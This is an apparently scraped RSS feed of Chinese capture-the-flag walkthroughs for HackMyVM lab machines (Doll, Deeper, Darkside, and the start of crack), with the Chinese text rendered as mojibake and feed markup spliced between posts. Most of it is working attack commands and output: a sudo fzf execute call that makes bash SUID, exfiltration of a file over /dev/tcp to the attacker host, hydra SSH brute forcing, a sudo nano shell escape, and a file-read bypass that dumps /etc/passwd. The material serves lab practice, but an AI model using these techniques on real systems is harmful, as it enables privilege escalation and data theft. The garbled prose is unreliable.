‚Äã`fzf`‚Äã ÊòØ‰∏Ä‰∏™‰∫§‰∫íÂºèÂëΩ‰ª§Ë°åÊ®°Á≥äÊü•ÊâæÂ∑•ÂÖ∑ÔºåÂπ∂‰∏îÂÖ∂ `--listen`‚Äã ÈÄâÈ°πÂÖÅËÆ∏ÂÆÉÊé•Êî∂Êù•Ëá™ËøúÁ®ãËøûÊé•ÁöÑÂëΩ‰ª§„ÄÇ`fzf`‚Äã ÊîØÊåÅ `execute`‚Äã ÁªëÂÆöÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂÆÉÊù•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºåÂåÖÊã¨ÂêØÂä® `bash`‚Äã Êàñ `sh`‚Äã ‰ª•Ëé∑Âèñ root shell„ÄÇ

```
bela@doll:~$ sudo /usr/bin/fzf --listen=1337
```

ÂéªÈáçÊñ∞ÁôªÂΩï‰∏Ä‰∏™Á™óÂè£

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ ssh bela@192.168.72.129 -i id_rsa   
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128

bela@doll:~$ curl -X POST --data '{'call':'execute','args':['chmod u+s /bin/bash']}' http://127.0.0.1:1337
unknown action: {'call':'execute','args':['/bin/bash']}
bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337

```

ÊàêÂäüÊãøÂà∞root shell

```
bela@doll:~$ bash -p
bash-5.1# id
uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‚Äçsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Doll.html</guid><pubDate>Fri, 27 Jun 2025 09:33:03 +0000</pubDate></item><item><title>hmv_Deeper</title><link>https://7r1UMPHK.github.io/post/hmv_Deeper.html</link><description># hmv_Deeper

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.143
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST
Nmap scan report for 192.168.205.143
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

# 2.Ë∏©ÁÇπ

![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)

Âä†‰∏ä

![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)

![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)

![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)

Ëß£Á†ÅÔºà[cyberchef](https://cyberchef.org/)Ôºâ

![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)

![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)

# 3.ÊèêÊùÉ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh alice@192.168.205.143                                             
The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
alice@192.168.205.143's password: 
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
alice@deeper:~$ sudo -l
[sudo] password for alice: 
Sorry, user alice may not run sudo on deeper.
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d

```

![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)

```bash
alice@deeper:/home$ su - bob
Password: 
bob@deeper:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ sudo -l
[sudo] password for bob: 
Sorry, user bob may not run sudo on deeper.
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
bob@deeper:~$ cat root.zip &gt; /dev/tcp/192.168.205.141/7777

#kali
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ nc -lvnp 7777 &gt; root.zip 
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ zip2john root.zip &gt; hash                          
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ john --show hash                                  
root.zip/root.txt:bob:root.txt:root.zip::root.zip

1 password hash cracked, 0 left                                              
                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt                                                                                                                                               
                                                                                                                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat root.txt
root:IhateMyPassword
                                
```

ÁôªÂΩïroot

```bash
bob@deeper:~$ su -
Password: 
root@deeper:~# id
uid=0(root) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Deeper.html</guid><pubDate>Fri, 27 Jun 2025 09:33:00 +0000</pubDate></item><item><title>hmv_Darkside</title><link>https://7r1UMPHK.github.io/post/hmv_Darkside.html</link><description># hmv_Darkside

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.134
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

‰∏ÄÂè∑Áî∑ÂòâÂÆæÔºå`nmap`ÂºÄÊâ´

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST
Nmap scan report for 192.168.205.134
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 
```

‰ºòÂÖàÊü•Áúã**httpÊúçÂä°**Á´ØÂè£Ôºå**sshÁ´ØÂè£**Â¶ÇÊûúÊ≤°ÊúâËøõÂ±ïÂÜçËøõË°åÁàÜÁ†¥

# 2.Ë∏©ÁÇπ

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

ÊòØ‰∏™ÁôªÂΩïÈ°µÔºåÂ∞ùËØï`sqlÊ≥®ÂÖ•„ÄÅ‰∏áËÉΩÂØÜÁ†Å„ÄÅÂº±ÂØÜÁ†Å`ÂùáÊó†ÊûúÔºå‰ΩøÁî®`Nikto`ËøõË°åWEBÊºèÊ¥ûÊâ´Êèè

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nikto -h 192.168.205.134                       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.205.134
+ Target Hostname:    192.168.205.134
+ Target Port:        80
+ Start Time:         2025-01-14 10:43:28 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Êúâ‰∏™Â§á‰ªΩÁõÆÂΩïÔºåÊàë‰ª¨ÂéªÁΩëÈ°µÊü•Áúã‰∏Ä‰∏ã

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

Âè™Êúâ‰∏Ä‰∏™`vote.txt`ÊñáÊú¨Êñá‰ª∂ÔºåÁªô‰∫ÜÊàë‰ª¨Âá†‰∏™Áî®Êà∑ÂêçÔºåÊàë‰ª¨ÊãøËøôÂá†‰∏™Áî®Êà∑ÂêçÂéªÂ∞ùËØïÁàÜÁ†¥sshÊúçÂä°

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ vim user  
                                      
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o
kevin
                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task
[DATA] attacking ssh://192.168.205.134:22/

```

ÁàÜÁ†¥ÁöÑÂêåÊó∂ÔºåÊàë‰ª¨Áî®burp‰πüÁàÜÁ†¥ÁôªÂΩïÈ°µ

![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)

ÈÄâËøô‰∏™ÔºåËÆæÁΩÆÂ•ΩÂèÇÊï∞ÂêéÂêØÂä®ÁàÜÁ†¥

![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)

ÊåâÁÖßÈïøÂ∫¶ÊéíÂ∫èÔºåÂèØ‰ª•ÂèëÁé∞ËØ•ÁªÑÁî®Êà∑ÂØÜÁ†ÅÈïøÂ∫¶ÊòéÁªÜ‰∏ç‰∏ÄÊ†∑ÔºåÂ∞ùËØïÁôªÂΩï

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

Ëé∑Âæó‰∫Ü‰∏Ä‰∏≤Á±ª‰ºº‰∫ébase64ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊãøÂéª[cyberchef](https://cyberchef.org/)Ëß£ÂØÜ

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

ÔºàÂ∞¥Â∞¨‰∫ÜÔºåÊòØbase58ÔºâËæìÂá∫‰∫Ü‰∏Ä‰∏≤ÂíåÁΩëÂùÄÂæàÂÉèÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨ËÆøÈóÆ‰∏Ä‰∏ã

![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)

ÈóÆÊàë‰ª¨ÈÄâÂì™ËæπÔºåÊàë‰ª¨Êü•ÁúãÊ∫êÁ†Å

![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)

‰ª£Á†ÅÊòØÂÆûÁé∞‰∫ÜÂΩìÂ≠òÂú®Âêç‰∏∫ **side** ÁöÑ **cookie** Âπ∂‰∏îÂÆÉÁöÑÂÄºÊòØ `darkside`ÔºåÈÇ£‰πàËÑöÊú¨Â∞ÜÈáçÂÆöÂêëÁî®Êà∑Âà∞ URL `hwvhysntovtanj.password`ÔºåÊàëÊáíÂæóÊîπ**cookie**‰∫ÜÔºåÊàë‰ª¨Áõ¥Êé•ËÆøÈóÆ

![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)

Ëé∑Âæó‰∫Ü‰∏Ä‰∏™Ë≤å‰ººÊòØ**sshÊúçÂä°**ÂØÜÁ†ÅÔºåÊàë‰ª¨Â∞ùËØï‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh kevin@192.168.205.134  
The authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.
ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.
kevin@192.168.205.134's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
```

ÊàêÂäüËøûÊé•

# 3.ÊèêÊùÉ

```bash
kevin@darkside:~$ sudo -l
[sudo] password for kevin: 
Sorry, user kevin may not run sudo on darkside.
kevin@darkside:~$ 
kevin@darkside:~$ ls -la
total 32
drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo 'Congratulations on the OSCP Xerosec'
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba

```

Âú®ÂÆ∂ÁõÆÂΩïÂèëÁé∞‰∫Ü`.history`ÊñáÊú¨Êñá‰ª∂ÔºåÊü•ÁúãËé∑Âæó‰∫Ü`rijaba`ÁöÑÂØÜÁ†ÅÔºåÂ∞ùËØïÁôªÂΩï

```bash
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

ÁªßÁª≠ÊµãËØïÊèêÊùÉ

```bash
rijaba@darkside:/home/kevin$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano

```

ÂèØ‰ª•‰ΩøÁî®**root**ËøêË°å`nano`ÔºåÊàë‰ª¨ËøõË°åÊèêÊùÉ

```bash
rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
```

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)

ËøõÂÖ•`nano`Êåâ**CTRL+R**Ôºå**CTRL+X**ÔºåËæìÂÖ•`reset; sh 1&gt;&amp;0 2&gt;&amp;0`Â∞±ÊèêÊùÉÊàêÂäü‰∫Ü

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Darkside.html</guid><pubDate>Fri, 27 Jun 2025 09:32:57 +0000</pubDate></item><item><title>hmv_crack</title><link>https://7r1UMPHK.github.io/post/hmv_crack.html</link><description># hmv_crack

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.143
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST
Nmap scan report for 192.168.205.143
Host is up (0.00043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds

```

`4000„ÄÅ12359`ÊòØ‰ªÄ‰πàÁ´ØÂè£Êàë‰ª¨‰∏çÁü•ÈÅìÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàÁúã**ftp**Á´ØÂè£

# 2.Ë∏©ÁÇπ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.143                         
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||50526|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp&gt; cd upload
250 Directory successfully changed.
ftp&gt; ls
229 Entering Extended Passive Mode (|||30618|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp&gt; mget crack.py
mget crack.py [anpqy?]? y
229 Entering Extended Passive Mode (|||35830|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (799.51 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat crack.py  
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = 'NO'
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = '/srv/ftp/upload/'+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,'r')
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass

```

ÂèëÁé∞‰∫Ü`12359`Á´ØÂè£ÁöÑËøêË°åËÑöÊú¨ÔºåËÑöÊú¨ÂÆûÁé∞Êñá‰ª∂ËØªÂèñÊúçÂä°„ÄÇÊàë‰ª¨‰∏äÂéªÁúãÁúã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc 192.168.205.143 12359                       
File to read:/etc/passwd
NOFile to read:crack.py
['import os\n', 'import socket\n', 's = socket.socket()\n', 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n', 'port = 12359\n', 's.bind(('', port))\n', 's.listen(50)\n', '\n', 'c, addr = s.accept()\n', 'no = 'NO'\n', 'while True:\n', '        try:\n', '                c.send('File to read:'.encode())\n', '                data = c.recv(1024)\n', '                file = (str(data, 'utf-8').strip())\n', '                filename = os.path.basename(file)\n', '                check = '/srv/ftp/upload/'+filename\n', '                if os.path.isfile(check) and os.path.isfile(file):\n', '                        f = open(file,'r')\n', '                        lines = f.readlines()\n', '                        lines = str(lines)\n', '                        lines = lines.encode()\n', '                        c.send(lines)\n', '                else:\n', '                        c.send(no.encode())\n', '        except ConnectionResetError:\n', '                pass\n']
```

ÁªèËøáÂ∞ùËØïÂèØ‰ª•ÂèëÁé∞Âè™ÂèØ‰ª•Êü•ÁúãÂ≠òÂú®ÁöÑÊñá‰ª∂Ôºå‰ΩÜÊòØÊ†πÊçÆÊ∫êÁ†ÅÊàë‰ª¨ÂèØ‰ª•ÁúãÂá∫Ôºå‰ªñÂè™ÊòØÂà§Êñ≠‰∫Ü`/srv/ftp/upload/` ‰∏≠ÊòØÂê¶Â≠òÂú®Ëøô‰∏™Êñá‰ª∂ÔºåÂ¶ÇÊûúÂ≠òÂú®Â∞±‰ºöÊü•ËØ¢ÔºåÊàë‰ª¨ÂèØ‰ª•‰∏ä‰º†‰∏Ä‰∏™Êàë‰ª¨ÊÑüÂÖ¥Ë∂£ÁöÑÈáçÂêçÊñá‰ª∂ÂéªËØïÂõæËØªÂèñ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.143
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||19129|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp&gt; cd upload
250 Directory successfully changed.
ftp&gt; ls
229 Entering Extended Passive Mode (|||41641|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp&gt; put passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||16042|)
150 Ok to send data.
100% |*****************************************************************************************|     4        0.20 KiB/s    00:00 ETA
226 Transfer complete.
4 bytes sent in 00:00 (0.19 KiB/s)
ftp&gt; put id_rsa 
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||42637|)
150 Ok to send data.
100% |*****************************************************************************************|  2656      135.55 KiB/s    00:00 ETA
226 Transfer complete.
2656 bytes sent in 00:00 (129.95 KiB/s)

```

Âà©Áî®‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc 192.168.205.143 12359
File to read:/etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ echo 'root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats 